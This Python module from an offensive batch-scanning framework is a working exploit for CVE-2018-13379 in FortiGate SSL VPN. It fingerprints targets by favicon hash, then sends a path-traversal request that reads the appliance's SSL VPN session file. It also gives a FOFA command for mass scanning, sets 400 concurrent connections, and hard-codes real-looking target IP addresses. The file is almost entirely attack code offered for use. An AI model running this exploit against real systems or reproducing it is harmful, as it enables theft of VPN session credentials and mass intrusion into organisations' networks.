# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30
import hashlib

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


# fofa: icon_hash="945408572"
# python batch.py -m exploit.web.Vpn.Fortigate.unauth_readfile -cs -fs "icon_hash=\"945408572\" && country=\"CN\""

class Script(BaseScript):
    name = 'Fortigate'

    def __init__(self, target, pbar):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.READFILE
        # 编号
        self.bugNumber = 'CVE-2018-13379'
        # 来源
        self.refer = 'https://github.com/chaitin/xray/blob/53a0fbe6d4eae34a58305d15ef606c0e5afc4ba2/pocs/fortigate-cve-2018-13379-readfile.yml'
        # 特定路径判断
        self.detectPathList = ['/favicon.ico']
        # exec
        self.execPathList = ['/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession']
        # 进度条
        self.pbar = pbar
        self.infoset = 'whoami'
        # 相关信息
        self.info = 'SSL VPN'
        self.favicon = ['e462005902f81094ab3de44e4381de19', 'b7405d88bf3171526350904569e5514e']

    async def detect(self):
        try:
            async with aiohttp.ClientSession() as session:
                for detectPath in self.detectPathList:
                    url = f'https://{self.target}{detectPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                    async with session.get(url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                        if response is not None:
                            text = await response.read()
                            m1 = hashlib.md5()
                            m1.update(text)
                            theMD5 = m1.hexdigest()
                            for _ in self.favicon:
                                if _ == theMD5:
                                    self.flag = True
                                    tqdm.write(Fore.RED + '[{}] {}'.format('Fortigate Finger', url))
                                    return {'name': 'Fortigate Finger', 'url': url, 'software': 'Fortigate'}
        except Exception:
            return None

    async def exec(self):
        try:
            async with aiohttp.ClientSession() as session:
                for execPath in self.execPathList:
                    url = f'https://{self.target}{execPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{execPath}'
                    async with session.get(url=url, headers=self.headers, timeout=15, verify_ssl=False) as response:
                        if response is not None and response.status == 200:
                            text = await response.read()
                            if 'var fgt_lang =' in str(text):
                                tqdm.write(Fore.RED + '[{}] {}'.format('Fortigate ReadFile', url))
                                return {'name': 'Fortigate ReadFile', 'url': url, 'software': 'Fortigate'}
        except Exception:
            return None

    async def attack(self, semaphore):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        self.pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    # import requests
    # import hashlib
    #
    # resp = requests.get('https://190.116.53.170/favicon.ico', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)
    semaphore = asyncio.Semaphore(400)
    sc = Script('118.163.153.181', 1)
    l = asyncio.get_event_loop()
    l.run_until_complete(sc.attack(semaphore))
